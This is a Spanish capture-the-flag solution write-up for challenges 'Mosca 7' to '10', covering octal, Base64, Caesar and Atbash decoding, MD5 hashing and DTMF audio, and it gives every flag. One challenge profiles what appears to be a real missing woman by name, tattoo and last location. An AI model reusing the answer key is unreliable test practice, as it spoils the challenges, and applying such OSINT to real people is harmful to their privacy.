<li><p>La pista se presenta en forma de acertijo poÃ©tico para
identificar el orden de pulsaciÃ³n.</p></li>
<li><p>Se introduce el concepto de esteganografÃ­a visual, cifrado
Braille y extracciÃ³n de contraseÃ±as no convencionales.</p></li>
<li><p>Enfrenta al jugador con la interpretaciÃ³n de cÃ³digos no
textualesâ€”ideal para retos tipo CTF que mezclan lo digital con lo
analÃ³gico.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-7-md5-de-imagen-jpeg"><strong>ğŸ Mosca 7 â€“ MD5 de Imagen
JPEG</strong></h1>
<p><strong>CategorÃ­a:</strong> Cripto / Hash / IngenierÃ­a Digital<br />
<strong>Nivel:</strong> BÃ¡sico<br />
<strong>Mosca capturada:</strong> 27303a04ee484427ca5b3eb482772f3f</p>
<p><span id="_Toc207189847" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>Navegador o editor HTML para leer cÃ³digo fuente</p></li>
<li><p>Imagen menu6.jpg</p></li>
<li><p>Generador de hash MD5 (puede ser web o desde terminal)</p></li>
</ul>
<p><span id="_Toc207189848" class="anchor"></span><strong>ğŸ“œ Pista
inicial</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina menu.html encontramos el siguiente
cÃ³digo:</p>
<p>&lt;!â€”</p>
<p>ğŸ”</p>
<p>105 154 40 150 141 163 150 40 115 104 65 40 144 145 40 154 141 40 151
155 141 147 145 156 40 144 145 154 40 155 145 156 165 40 66 40 145 163
40 154 141 40 155 157 163 143 141 40 67</p>
<p>--&gt;</p>
<p>A simple vista, este cÃ³digo podrÃ­a ser Octal ya que no hay ningÃºn 8
ni ningÃºn 9.</p>
<p><strong>Â¿QuÃ© es octal?</strong></p>
<p>El sistema octal usa base 8 (dÃ­gitos del 0 al 7). Cada nÃºmero
representa un valor que puede convertirse a decimal, y luego a un
carÃ¡cter segÃºn el cÃ³digo ASCII.</p>
<p><strong>Procedimiento para decodificar:</strong></p>
<p>1. Interpretar cada nÃºmero como octal.</p>
<p>2. Convertir a decimal.</p>
<p>3. Convertir el decimal a carÃ¡cter ASCII.</p>
<p><strong>Ejemplo con los primeros valores:</strong></p>
<p>105 (octal) â†’ 1Ã—64 + 0Ã—8 + 5 = 69 â†’ 'E'</p>
<p>154 (octal) â†’ 1Ã—64 + 5Ã—8 + 4 = 108 â†’ 'l'</p>
<p>40 (octal) â†’ 4Ã—8 + 0 = 32 â†’ espacio ' '</p>
<p>150 (octal) â†’ 1Ã—64 + 5Ã—8 + 0 = 104 â†’ 'h'</p>
<p>141 (octal) â†’ 1Ã—64 + 4Ã—8 + 1 = 97 â†’ 'a'</p>
<p>163 (octal) â†’ 1Ã—64 + 6Ã—8 + 3 = 115 â†’ 's'</p>
<p>150 (octal) â†’ 104 â†’ 'h'</p>
<p><strong>Hasta aquÃ­ ya tenemos:</strong></p>
<p>105 154 40 150 141 163 150</p>
<p>â†“</p>
<p>E l â£ h a s h</p>
<p>Podemos usar alguno de los servicios online para traducirlo:</p>
<p><a
href="https://photo333.com/text-to-octal-es.php">https://photo333.com/text-to-octal-es.php</a></p>
<p><a
href="https://seostudio.tools/es/text-to-octal">https://seostudio.tools/es/text-to-octal</a></p>
<p><img src="cookbook/media/image60.png"
style="width:5.90694in;height:2.26042in" /></p>
<p>Esto nos revela el siguiente texto::</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>El hash MD5 de la imagen del menu 6 es la mosca 7</p>
<p>--&gt;</p>
<p>SegÃºn esto debemos sacar el hash MD5 de la imagen menu6.jpg que estÃ¡
en la carpeta archivos:</p>
<p><img src="cookbook/media/image61.jpg"
style="width:2.35417in;height:2.59206in" /></p>
<p>El hash MD5 de la imagen del menÃº 6 es la Mosca 7</p>
<p>Esto nos indica que debemos calcular el hash MD5 de menu6.jpg.</p>
<p><span id="_Toc207189849" class="anchor"></span><strong>ğŸ§ª
Procedimiento tÃ©cnico</strong></p>
<p><strong>1. Acceder al archivo menu6.jpg</strong></p>
<p>AsegÃºrate de tener acceso local a la imagen en la carpeta de archivos
del CTF.</p>
<p><strong>2. Calcular el hash MD5</strong></p>
<p>Puedes hacerlo de dos maneras:</p>
<p><strong>ğŸ”§ Desde terminal (Linux/macOS)</strong></p>
<p>md5sum menu6.jpg</p>
<p><strong>ğŸ”§ Desde PowerShell (Windows)</strong></p>
<p>Get-FileHash .\menu6.jpg -Algorithm MD5</p>
<p><strong>ğŸŒ Desde sitio web online</strong></p>
<p>Para calcular el hash MD5 de una imagen online, puedes utilizar
herramientas como:</p>
<p>online-convert.com</p>
<p>hash.online-convert.com</p>
<p><a
href="https://hash.online-convert.com/es/generador-md5">https://hash.online-convert.com/es/generador-md5</a></p>
<p><a
href="https://emn178.github.io/online-tools/md5_checksum.html">https://emn178.github.io/online-tools/md5_checksum.html</a></p>
<p>Estas herramientas te permiten subir la imagen y generar su hash MD5,
que es una cadena Ãºnica de 32 caracteres hexadecimales.</p>
<p><img src="cookbook/media/image62.png"
style="width:4.29604in;height:2.52589in" /></p>
<p><img src="cookbook/media/image63.png"
style="width:5.41802in;height:2.73958in" /></p>
<p><strong>3. Resultado</strong></p>
<p>El hash MD5 obtenido para menu6.jpg es:</p>
<p>27303a04ee484427ca5b3eb482772f3f</p>
<p><span id="_Toc207189850" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 7 atrapada: '27303a04ee484427ca5b3eb482772f3f'</mark></p>
<p><span id="_Toc207189851" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Este reto introduce la nociÃ³n de â€œhuella digitalâ€ de
archivos.</p></li>
<li><p>Refuerza el concepto de unicidad de los archivos a travÃ©s de su
hash.</p></li>
<li><p>EnseÃ±a cÃ³mo verificar la integridad y autenticidad sin abrir el
contenido.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-8-investigaciÃ³n-de-persona-desaparecida"><strong>ğŸ Mosca
8 â€“ InvestigaciÃ³n de Persona Desaparecida</strong></h1>
<p><strong>CategorÃ­a:</strong> OSINT / EsteganografÃ­a / Base64<br />
<strong>Nivel:</strong> Intermedio-Avanzado<br />
<strong>Mosca capturada:</strong> Ferriera</p>
<p><span id="_Toc207189853" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>Decodificador Base64</p></li>
<li><p>Buscadores inversos de imagen (Google, TinEye)</p></li>
<li><p>Navegador web para investigaciÃ³n</p></li>
<li><p>Sentido detective ğŸ•µï¸â€â™‚ï¸</p></li>
</ul>
<p><span id="_Toc207189854" class="anchor"></span><strong>ğŸ§ª
Procedimiento tÃ©cnico</strong></p>
<p><strong>1. Descifrar la pista codificada</strong></p>
<p>En el cÃ³digo fuente de localizaciÃ³n.html encontramos un texto:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>TGEgREVBIGJ1c2NhIGEgdW5hIGNoaWNhIGRlc2FwYXJlY2lkYS4gTGEgcGFsYWJyYSBxdWUgbGxldmEgdGF0dWFkYSBlbiBlbCBwZWNobyBkZXJlY2hvIGVzIGxhIE1vc2NhIDggICAgIA==</p>
<p>--&gt;</p>
<p>Esta cadena delata que estÃ¡ en formato Base64 por varias razones
tÃ©cnicas muy claras:</p>
<p><strong>ğŸ” Â¿CÃ³mo se sabe que es Base64?</strong></p>
<p><strong>âœ… 1.</strong> Conjunto de caracteres restringido</p>
<p>Base64 <strong>solo usa 64 caracteres vÃ¡lidos</strong>, ademÃ¡s del
signo = como relleno opcional al final:</p>
<p>Aâ€“Z, aâ€“z, 0â€“9, +, /</p>
<p>Y esta cadena solo contiene:</p>
<p>Letras mayÃºsculas y minÃºsculas</p>
<p>NÃºmeros</p>
<p>El signo = al final (relleno tÃ­pico de Base64)</p>
<p><strong>âœ… 2.</strong> Longitud tÃ­pica (mÃºltiplo de 4)</p>
<p>Las cadenas Base64 <strong>siempre tienen una longitud mÃºltiplo de
4</strong> caracteres, porque cada 3 bytes de datos se codifican como 4
caracteres Base64.</p>
<p>Esta cadena tiene <strong>104 caracteres</strong>, que es mÃºltiplo de
4.</p>
<p><strong>âœ… 3.</strong> Uso del signo <strong>=</strong> al final</p>
<p>En Base64, los signos = se usan como <strong>relleno
(padding)</strong> para alinear los bloques.</p>
<p>El final de esta cadena termina con ==, una pista muy fuerte de
codificaciÃ³n Base64.</p>
<p>âœ… ConclusiÃ³n</p>
<p><strong>Sabemos que la cadena estÃ¡ en Base64 por:</strong></p>
<table>
<colgroup>
<col style="width: 52%" />
<col style="width: 47%" />
</colgroup>
<thead>
<tr>
<th style="text-align: center;"><strong>Evidencia</strong></th>
<th style="text-align: center;"><strong>ExplicaciÃ³n</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>Solo usa letras, nÃºmeros, +, /, y =</td>
<td>Base64 solo permite ese conjunto</td>
</tr>
<tr>
<td>Longitud mÃºltiplo de 4</td>
<td>Requisito del formato Base64</td>
</tr>
<tr>
<td>Termina en ==</td>
<td>Padding tÃ­pico de Base64</td>
</tr>
<tr>
<td>Al decodificar, es texto legible</td>
<td>Muy tÃ­pico en mensajes ocultos</td>
</tr>
</tbody>
</table>
<p><strong>Â¿QuÃ© es Base64?</strong></p>
<p>La codificaciÃ³n en Base64 es un mÃ©todo que permite representar datos
binarios (como imÃ¡genes, archivos, etc.) usando solo caracteres de texto
ASCII. Se utiliza comÃºnmente para transmitir datos por medios que solo
permiten texto, como correos electrÃ³nicos, JSON, o ciertos protocolos de
red.</p>
<p><strong>Â¿Por quÃ© usar Base64?</strong></p>
<p>Muchos sistemas (como el correo electrÃ³nico o las URLs) solo permiten
caracteres de texto. Si se necesita enviar datos binarios (como una
imagen o un archivo PDF), hay que convertir esos datos en una forma
segura que pueda viajar sin corromperse: Base64 es una de esas
formas.</p>
<p><strong>Â¿CÃ³mo funciona?</strong></p>
<ol type="1">
<li><p>Entrada binaria: Se toma el archivo o cadena original (en
binario).</p></li>
<li><p>AgrupaciÃ³n: Se divide el flujo binario en grupos de 3 bytes (24
bits).</p></li>
<li><p>DivisiÃ³n en bloques de 6 bits: Cada grupo de 24 bits se divide en
4 grupos de 6 bits.</p></li>
<li><p>ConversiÃ³n: Cada grupo de 6 bits se convierte en un nÃºmero entre
0 y 63, que luego se traduce a un carÃ¡cter Base64 usando una tabla
estÃ¡ndar.</p></li>
<li><p>Relleno (Padding): Si el nÃºmero total de bytes no es mÃºltiplo de
3, se agregan caracteres = al final para completar la
codificaciÃ³n.</p></li>
</ol>
<p><strong>Ejemplo simple</strong></p>
<p>SupÃ³n que queremos codificar el texto: "Man"</p>
<ul>
<li><p>En ASCII: M = 77, a = 97, n = 110</p></li>
<li><p>En binario: 01001101 01100001 01101110 â†’ 24 bits</p></li>
</ul>
<p>Dividimos en bloques de 6 bits:</p>
<p>010011 010110 000101 101110 â†’ valores decimales: 19, 22, 5, 46</p>
<p>Con la tabla Base64, esto se convierte en:</p>
<p>TWFu</p>
<p><strong>Tabla Base64 estÃ¡ndar</strong></p>
<p>Base64 usa 64 caracteres:</p>
<p>A-Z (26) + a-z (26) + 0-9 (10) + '+' + '/'</p>
<p>Es decir, el conjunto completo es:</p>
<p>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</p>
<p><strong>CaracterÃ­sticas clave</strong></p>
<ul>
<li><p>No es un mÃ©todo de cifrado ni de compresiÃ³n.</p></li>
<li><p>Aumenta el tamaÃ±o de los datos en un ~33%.</p></li>
<li><p>Se usa en:</p></li>
</ul>
<ul>
<li><p>Correos electrÃ³nicos (MIME)</p></li>
<li><p>CodificaciÃ³n de imÃ¡genes en HTML
(data:image/png;base64,...)</p></li>
<li><p>TransmisiÃ³n de tokens o contraseÃ±as en HTTP (Authorization:
Basic)</p></li>
</ul>
<p><strong>Ventajas</strong></p>
<ul>
<li><p>Compatible con sistemas que solo aceptan texto.</p></li>
<li><p>FÃ¡cil de codificar/decodificar.</p></li>
</ul>
<p><strong>Desventajas</strong></p>
<ul>
<li><p>Aumenta el tamaÃ±o del archivo.</p></li>
<li><p>No es seguro por sÃ­ solo: los datos codificados pueden ser
fÃ¡cilmente decodificados.</p></li>
</ul>
<p>Si utilizamos cualquier servicio online para descifrarlo veremos el
texto descodificado:</p>
<p><a
href="https://www.base64encode.org/es/">https://www.base64encode.org/es/</a></p>
<p><a
href="https://www.convertstring.com/es/EncodeDecode/Base64Decode">https://www.convertstring.com/es/EncodeDecode/Base64Decode</a></p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>La DEA busca a una chica desaparecida. La palabra que lleva tatuada
en el pecho derecho es la Mosca 8</p>
<p>--&gt;</p>
<p><strong>2. Analizar la imagen del reto</strong></p>
<p>En la carpeta de archivos hay una imagen llamada desaparecida.jpg.
Una bÃºsqueda inversa con <strong>Google ImÃ¡genes</strong> revela que se
trata de <strong>Anastasia Karma Ferriera</strong>, una joven
desaparecida en el estado de Nuevo MÃ©xico.</p>
<p><img src="cookbook/media/image64.png"
style="width:5.76977in;height:3.67283in" /></p>
<p><strong>3. InvestigaciÃ³n OSINT (Open Source
Intelligence)</strong></p>
<p>Una bÃºsqueda mÃ¡s exhaustiva de los enlaces e imÃ¡genes nos lleva a
localizar varias fotos de Anastasia:</p>
<p><img src="cookbook/media/image65.png"
style="width:1.78681in;height:3.35347in" /><img
src="cookbook/media/image66.png"
style="width:1.67361in;height:3.35347in" /><img
src="cookbook/media/image67.png"
style="width:1.84653in;height:3.35347in" /></p>
<p><img src="cookbook/media/image68.png"
style="width:3.4656in;height:3.03403in" /><img
src="cookbook/media/image69.png"
style="width:2.18681in;height:3.02708in" /></p>
<p>En la Ãºltima foto se aprecia que lleva un tatuaje en el pecho, pero
no es posible distinguirlo.</p>
<p>Encontramos varios enlaces informando de su desapariciÃ³n:</p>
<ul>
<li><p><a
href="https://www.thevanishedpodcast.com/episodes/2024/12/13/episode-469-anastasia-ferriera">https://www.thevanishedpodcast.com/episodes/2024/12/13/episode-469-anastasia-ferriera</a></p></li>
<li><p><a
href="https://www.sotwe.com/missingpeople47">https://www.sotwe.com/missingpeople47</a></p></li>
<li><p><a
href="https://disappearedblog.com/anastasia-ferriera/">https://disappearedblog.com/anastasia-ferriera/</a></p></li>
</ul>
<p><img src="cookbook/media/image70.png"
style="width:5.90694in;height:2.96042in" /></p>
<p><a
href="https://missingpersonscenter.org/missing-persons-directory/missing-adults/anastasia-karma-ferriera/">https://missingpersonscenter.org/missing-persons-directory/missing-adults/anastasia-karma-ferriera/</a></p>
<p><img src="cookbook/media/image71.png"
style="width:5.90694in;height:2.39375in" /></p>
<p>Pero la ubicaciÃ³n del Tattoo â€˜Ferrieraâ€™ no es la misma en las dos
webs que lo mencionan.</p>
<p>Si seguimos investigando nos lleva a los siguientes enlaces donde
encontramos la ficha oficial de su desapariciÃ³n:</p>
<ul>
<li><p><a
href="https://www.namus.gov/MissingPersons/Search#/results">https://www.namus.gov/MissingPersons/Search#/results</a></p></li>
<li><p><a
href="https://www.namus.gov/MissingPersons/Case#/103819?nav">https://www.namus.gov/MissingPersons/Case#/103819?nav</a></p></li>
</ul>
<p><img src="cookbook/media/image72.png"
style="width:5.90694in;height:3.84375in" /></p>
<p>Anastasia desapareciÃ³ en el condado de Bernalillo, en Albuqerque,
Nuevo MÃ©xico 87110:</p>
<p><img src="cookbook/media/image73.png"
style="width:5.90694in;height:2.07986in" /></p>
<p>Ãšltima ubicaciÃ³n:</p>
<p><a
href="https://www.google.com/maps/place/35%C2%B006&#39;03.6%22N+106%C2%B034&#39;12.7%22W/@35.1009909,-106.5701927,17z/data=!3m1!4b1!4m4!3m3!8m2!3d35.1009909!4d-106.5701927?entry=ttu&amp;g_ep=EgoyMDI1MDcxNi4wIKXMDSoASAFQAw%3D%3D">https://www.google.com/maps/place/35%C2%B006'03.6%22N+106%C2%B034'12.7%22W/@35.1009909,-106.5701927,17z/data=!3m1!4b1!4m4!3m3!8m2!3d35.1009909!4d-106.5701927?entry=ttu&amp;g_ep=EgoyMDI1MDcxNi4wIKXMDSoASAFQAw%3D%3D</a></p>
<p><img src="cookbook/media/image74.png"
style="width:5.90694in;height:3.19792in" /></p>
<p>Se confirma que el tatuaje en su pecho dice:</p>
<p><strong>Ferriera</strong></p>
<p>Este nombre es el objetivo del reto.</p>
<p><span id="_Toc207189855" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 8 atrapada: 'Ferriera'</mark></p>
<p><span id="_Toc207189856" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>El reto enseÃ±a la importancia del anÃ¡lisis de cÃ³digo fuente y la
decodificaciÃ³n de mensajes ocultos.</p></li>
<li><p>Introduce al jugador a la tÃ©cnica OSINT, cada vez mÃ¡s usada en
ciberseguridad y anÃ¡lisis forense.</p></li>
<li><p>TambiÃ©n sensibiliza sobre cÃ³mo los datos pÃºblicos pueden ayudar
(o exponer) casos reales.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-9-reconocimiento-de-tonos-dtmf-en-audio"><strong>ğŸ Mosca
9 â€“ Reconocimiento de Tonos DTMF en Audio</strong></h1>
<p><strong>CategorÃ­a:</strong> EsteganografÃ­a auditiva / DTMF /
IngenierÃ­a inversa<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Mosca capturada:</strong> 378282246310005</p>
<p><span id="_Toc207189858" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p>Generador DTMF (por ejemplo, <a
href="https://onlinesound.net/dtmf-generator"><u>onlinesound.net/dtmf-generator</u></a>)</p></li>
<li><p>Reproductor de audio (Audacity, VLC, etc.)</p></li>
<li><p>Decoder online de DTMF: <a
href="https://dtmf.netlify.app/"><u>dtmf.netlify.app</u></a></p></li>
<li><p>Archivo de audio llamada.wav (simulado para el reto)</p></li>
</ul>
<p><span id="_Toc207189859" class="anchor"></span><strong>ğŸ“œ Pista
inicial</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina nosotros.html encontramos una pista
que dice:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>Tj MNJ pj nvlxvcajmx dvj yqbcj nv nt jdmqx ttjujmj.fje. Bn pj ujaljmx
nt lÃ³mqox mn dvj cjarncj mn laÃ©mqcx yjaj anjtqija dvj cajvbÃ±nanvlqj
Â¿LdÃ¡t nb nt lÃ³mqox mn tj cjarncj mn laÃ©mqcx? Nt vÃºunax lxuytncx mn tj
cjarncj nb tj Uxblj 9</p>
<p>--&gt;</p>
<p>Es razonable sospechar que se trata de un cifrado CÃ©sar por varias
razones:</p>
<p><strong>ğŸ§© Â¿CÃ³mo saber que es un cifrado CÃ©sar?</strong></p>
<ol type="1">
<li><p>Estructura gramatical similar al espaÃ±ol:</p></li>
</ol>
<ul>
<li><p>Aunque las palabras no tienen sentido directamente, mantienen una
longitud y estructura similar al espaÃ±ol.</p></li>
<li><p>Por ejemplo: â€œTj MNJ pjâ€ parece tener la misma estructura que â€œEl
ABC esâ€.</p></li>
</ul>
<ol start="2" type="1">
<li><p>DistribuciÃ³n de palabras:</p></li>
</ol>
<ul>
<li><p>El patrÃ³n de uso de artÃ­culos, preposiciones y signos de
puntuaciÃ³n es tÃ­pico del espaÃ±ol.</p></li>
<li><p>Hay una frase que termina en â€œÂ¿...?â€, tÃ­pica en
preguntas.</p></li>
</ul>
<ol start="3" type="1">
<li><p>No hay signos especiales ni palabras muy largas:</p></li>
</ol>
<ul>
<li><p>No parece un cifrado complejo (como VigenÃ¨re o RSA), sino algo
simple y por sustituciÃ³n.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Es uno de los cifrados mÃ¡s comunes en textos de ejemplo:</p></li>
</ol>
<ul>
<li><p>El cifrado CÃ©sar es uno de los primeros que se prueban al
analizar criptogramas de este tipo.</p></li>
</ul>
<p><strong>ğŸ›  Â¿QuÃ© es el cifrado CÃ©sar?</strong></p>
<p>Es un cifrado por sustituciÃ³n en el que cada letra se reemplaza por
otra un nÃºmero fijo de posiciones mÃ¡s adelante en el alfabeto.</p>
<p>Por ejemplo, con un desplazamiento de +1:</p>
<p>A â†’ B</p>
<p>B â†’ C</p>
<p>C â†’ D</p>
<p>â€¦</p>
<p>Z â†’ A</p>
<p><strong>âœ… Â¿CÃ³mo confirmar si es un cifrado CÃ©sar?</strong></p>
<p>Para comprobarlo se pueden usar herramientas automÃ¡ticas o hacerlo
manualmente:</p>
<ul>
<li><p>Probar desplazamientos del 1 al 25 (un ataque por fuerza
bruta).</p></li>
<li><p>Leer el resultado de cada uno y ver cuÃ¡l tiene sentido en
espaÃ±ol.</p></li>
</ul>
<p>Existen herramientas online como:</p>
<p><a
href="https://www.dcode.fr/caesar-cipher">https://www.dcode.fr/caesar-cipher</a></p>
<p>El Cifrado de Caesar es uno de los mÃ©todos de codificaciÃ³n conocidos
mÃ¡s antiguos. Es muy simple - sÃ³lo se cambian las posiciones del
alfabeto. La transformaciÃ³n se denomina ROTN, donde N es el valor de
cambio de posiciones y ROT significa "ROTAR", porque es un cambio
cÃ­clico.</p>
<p>Por ejemplo, ROT2 significa que "a" se vuelve "c", "b" se vuelve "d"
y al final "y" se vuelve "a", y "z" se vuelve "b". La cantidad de
transformaciones posibles depende de la longitud del alfabeto. Debido a
eso, es un mÃ©todo muy dÃ©bil, ya que puedes revisar todas las
combinaciones posibles de manera muy rÃ¡pida.</p>
<p>En este caso se ha aplicado ROT9</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>La DEA ha encontrado una pista en el audio llamada.wav. Se ha marcado
el cÃ³digo de una tarjeta de crÃ©dito para realizar una transferencia
Â¿CuÃ¡l es el cÃ³digo de la tarjeta de crÃ©dito? El nÃºmero completo de la
tarjeta es la Mosca 9</p>
<p>--&gt;</p>
<p>En el cÃ³digo fuente de nosotros.html, tras aplicar un cifrado CÃ©sar
con ROT9, se revela este mensaje:</p>
<p>La DEA ha encontrado una pista en el audio llamada.wav. Se ha marcado
el cÃ³digo de una tarjeta de crÃ©dito para realizar una transferencia.
Â¿CuÃ¡l es el cÃ³digo de la tarjeta de crÃ©dito? El nÃºmero completo de la
tarjeta es la Mosca 9.</p>
<p><span id="_Toc207189860" class="anchor"></span><strong>ğŸ§ª
Procedimiento tÃ©cnico</strong></p>
<p><strong>1. Reproducir y analizar llamada.wav</strong></p>
<p>En la carpeta â€œarchivosâ€ podemos encontrar el archivo
llamada.wav.</p>
<p>Este archivo simula el sonido de una tarjeta de crÃ©dito digitada por
tonos telefÃ³nicos (DTMF). Los tonos DTMF son combinaciones de
frecuencias que representan los dÃ­gitos del 0 al 9.</p>
<p>Lo ideal es usar tonos DTMF (Dual-Tone Multi-Frequency). Estos son
los tonos que usan los telÃ©fonos al marcar nÃºmeros, y son fÃ¡cilmente
reconocibles por sistemas automÃ¡ticos y humanos.</p>
<p><strong>1. Tipo de tono</strong></p>
<p>â€¢ Se ha usado DTMF (Dual Tone Multi-Frequency). Es el tipo correcto
de seÃ±al para simular la pulsaciÃ³n de teclas numÃ©ricas en un
telÃ©fono.</p>
<p><strong>2. DuraciÃ³n de cada tono</strong></p>
<p>â€¢ Se recomienda usar una duraciÃ³n entre 100 y 250 ms por tono para
que sea claro y reconocible, pero no muy lento.</p>
<p>Ejemplo comÃºn: Tono: 200 ms y Pausa: 100 ms.</p>
<p><strong>3. Contenido simulado</strong></p>
<p>Una tarjeta de crÃ©dito tiene 16 dÃ­gitos, separados normalmente en
grupos de 4. En este caso tenemos 15 dÃ­gitos.</p>
<p>Se ha usado el cÃ³digo de una tarjeta de AmÃ©rican express.</p>
<p><strong>Â¿CÃ³mo sabemos que es una AmÃ©rican Express?:</strong></p>
<p>Longitud: 15 dÃ­gitos (las AmEx tienen 15 dÃ­gitos, no 16).</p>
<p>Empieza por 34 o 37 (en este caso, 37), como todas las tarjetas
AmEx.</p>
<p>Formato tÃ­pico: 4-6-5 (como en el ejemplo).</p>
<p>Este nÃºmero pasa la verificaciÃ³n de Luhn, que es el algoritmo que
valida la estructura de las tarjetas, pero no es un nÃºmero real ni estÃ¡
asociado a ninguna cuenta.</p>
<p>Usamos el sitio <a
href="https://dtmf.netlify.app/"><u>dtmf.netlify.app</u></a> para cargar
el audio y obtener la secuencia numÃ©rica:</p>
<p><img src="cookbook/media/image75.png"
style="width:5.20332in;height:2.37955in" /></p>
<p><strong>2. Resultado del anÃ¡lisis</strong></p>
<p>El decodificador devuelve esta secuencia:</p>
<p>378282246310005</p>
<p>3782 822463 10005</p>
<p>Este nÃºmero tiene la estructura de una tarjeta de crÃ©dito
<strong>American Express</strong> (formato 4-6-5). Aunque no es real,
pasa la validaciÃ³n por el algoritmo de Luhn.</p>
<p><span id="_Toc207189861" class="anchor"></span><strong>ğŸ Resultado
final</strong></p>
<p><mark>Mosca 9 atrapada: '378282246310005'</mark></p>
<p><span id="_Toc207189862" class="anchor"></span><strong>ğŸ§ 
Razonamiento tÃ©cnico</strong></p>
<ul>
<li><p>Este reto introduce tÃ©cnicas de anÃ¡lisis de seÃ±al y
espectrograma.</p></li>
<li><p>EnseÃ±a cÃ³mo se pueden ocultar datos en audio utilizando
estÃ¡ndares como DTMF.</p></li>
<li><p>Combina seguridad, cripto, y audio en una experiencia
completa.</p></li>
</ul>
<p><strong><br />
</strong></p>
<h1 id="mosca-10-reconstrucciÃ³n-de-jpeg-desde-trÃ¡fico-http"><strong>ğŸ
Mosca 10 â€“ ReconstrucciÃ³n de JPEG desde trÃ¡fico HTTP</strong></h1>
<p><strong>CategorÃ­a:</strong> AnÃ¡lisis de red / Forense /
EsteganografÃ­a<br />
<strong>Nivel:</strong> Avanzado<br />
<strong>Mosca capturada:</strong> WALTER_WHITE</p>
<p><span id="_Toc207189864" class="anchor"></span><strong>ğŸ§°
Herramientas necesarias</strong></p>
<ul>
<li><p><strong>Wireshark</strong></p></li>
<li><p><strong>Servidor web local</strong> (python -m
http.server)</p></li>
<li><p>Fichero de captura: http_jpeg.pcap</p></li>
</ul>
<p><span id="_Toc207189865" class="anchor"></span><strong>ğŸ“œ Pista
inicial</strong></p>
<p>En el cÃ³digo fuente de la pÃ¡gina nosotros.html encontramos una pista
que dice:</p>
<p>&lt;!--</p>
<p>ğŸ”</p>
<p>Oz WVZ sz vnxlngizwl fnz ulgl xlÃ±l krhgz. Oz xzkgfiz wv giÃ¡urxl wv
ivw sggk_qkvt vhxlnwv oz Ã‘lhxz 10</p>
<p>--&gt;</p>
<p>El cifrado <strong>Atbash</strong> es menos comÃºn que el CÃ©sar, pero
tiene caracterÃ­sticas bastante distintivas que pueden hacernos sospechar
que un texto estÃ¡ cifrado con este sistema.</p>
<p><strong>ğŸ” Â¿QuÃ© es el cifrado Atbash?</strong></p>
<p>El cifrado <strong>Atbash</strong> es un cifrado monoalfabÃ©tico por
sustituciÃ³n donde cada letra se reemplaza por su "opuesta" en el
alfabeto.</p>
<p>En el alfabeto latino:</p>
<p>A â†”ï¸ Z</p>
<p>B â†”ï¸ Y</p>
<p>C â†”ï¸ X</p>
<p>D â†”ï¸ W</p>
<p>...</p>
<p>M â†”ï¸ N</p>
<p>Es un tipo de cifrado simÃ©trico y sin clave, ya que codificar y
decodificar es el mismo proceso.</p>
<p><strong>ğŸ§  Â¿QuÃ© hace sospechar que este texto estÃ© cifrado con
Atbash?</strong></p>
<ol type="1">
<li><p>PatrÃ³n de letras poco frecuentes:</p>
<ul>
<li><p>El texto contiene muchas letras como x, z, v, w, g, k, que no son
tan comunes en espaÃ±ol.</p></li>
<li><p>En Atbash, como cambia una letra por su opuesta, las letras mÃ¡s
frecuentes (como A, E, O) se convierten en letras menos frecuentes (Z,
V, L, etc.), alterando notablemente la distribuciÃ³n habitual de
letras.</p></li>
</ul></li>
<li><p>SimetrÃ­a visual:</p>
<ul>
<li><p>Las letras en palabras parecen inversas al patrÃ³n tÃ­pico del
espaÃ±ol.</p></li>
<li><p>Si lo lees sabiendo que Z=A, Y=B, etc., comienzas a ver posibles
palabras escondidas.</p></li>
</ul></li>
<li><p>Pocas vocales comunes:</p></li>
</ol>
<ul>
<li><p>En espaÃ±ol predominan vocales como a, e, o. Este texto tiene mÃ¡s
i, u, z, x, lo que hace pensar en una inversiÃ³n.</p></li>
</ul>
<ol start="4" type="1">
<li><p>Frases que podrÃ­an empezar con "El" â†’ "Oz":</p></li>
</ol>
<ul>
<li><p>Si ves "Oz WVZ szâ€¦", puedes pensar si "Oz" = "El".</p></li>
</ul>
<p>En Atbash:</p>
<p>O â†’ L</p>
<p>Z â†’ A</p>
<p>â†’ â€œOzâ€ = â€œElâ€</p>
<p>Confirmado: SÃ­, es <strong>Atbash</strong>.</p>
<p><strong>âœ… En resumen: Â¿Por quÃ© sospechar de Atbash?</strong></p>
<ul>
<li><p>Uso inusual de letras poco frecuentes.</p></li>
<li><p>Pocas vocales comunes del espaÃ±ol.</p></li>
<li><p>Frases con apariencia de espejo o inversiÃ³n.</p></li>
<li><p>SimetrÃ­a y sustituciÃ³n caracterÃ­stica.</p></li>
<li><p>Al invertir con <strong>Atbash</strong>, empiezan a aparecer
palabras coherentes.</p></li>
</ul>
<p>El Cifrado <strong>Atbash</strong> es un mÃ©todo de cifrado de
sustituciÃ³n monoalfabÃ©tica que funciona invirtiendo el alfabeto. Esto
significa que la primera letra del alfabeto se reemplaza por la Ãºltima,
la segunda por la penÃºltima, y asÃ­ sucesivamente.</p>
<p><strong>Â¿CÃ³mo Funciona?</strong></p>
<p>En el cifrado Atbash, cada letra se mapea a su "opuesto" en el
alfabeto. AquÃ­ tienes cÃ³mo se verÃ­a para el alfabeto latino:</p>
<ul>
